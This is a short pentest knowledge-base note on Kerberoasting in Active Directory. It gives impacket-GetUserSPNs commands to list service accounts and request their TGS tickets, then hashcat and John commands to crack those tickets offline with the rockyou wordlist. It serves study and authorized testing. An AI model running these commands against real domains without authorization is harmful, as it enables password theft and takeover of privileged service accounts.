---
tags: [pentest, enumeration, kerberos, kerberoast, impacket, ad, active-directory, recon, windows]
tool: impacket-GetUserSPNs
phase: 3
---
# Impacket GetUserSPNs (Kerberoasting Enum)

Find AD users with Service Principal Names (SPNs) and request their TGS tickets for offline cracking.

[[04 - Enumeration/00 - README|Folder index]]

## Usage

```bash
# List kerberoastable users
impacket-GetUserSPNs corp.local/user:password -dc-ip 10.10.10.10

# Request TGS tickets
impacket-GetUserSPNs corp.local/user:password -dc-ip 10.10.10.10 -request -outputfile tgs_hashes.txt

# With NTLM hash
impacket-GetUserSPNs corp.local/user -hashes :NTHASH -dc-ip 10.10.10.10 -request
```

## Crack the hashes

```bash
# Hashcat mode 13100 (Kerberos 5 TGS-REP etype 23)
hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt

# John
john tgs_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

## Why it works

Any domain user can request a TGS ticket for any service. The ticket is encrypted with the service account's password hash. Service accounts often have weak passwords and high privileges.

## See also

- [[13 - Impacket GetNPUsers (AS-REP)]] — targets users without pre-auth
- [[12 - kerbrute]] — enumerate usernames first
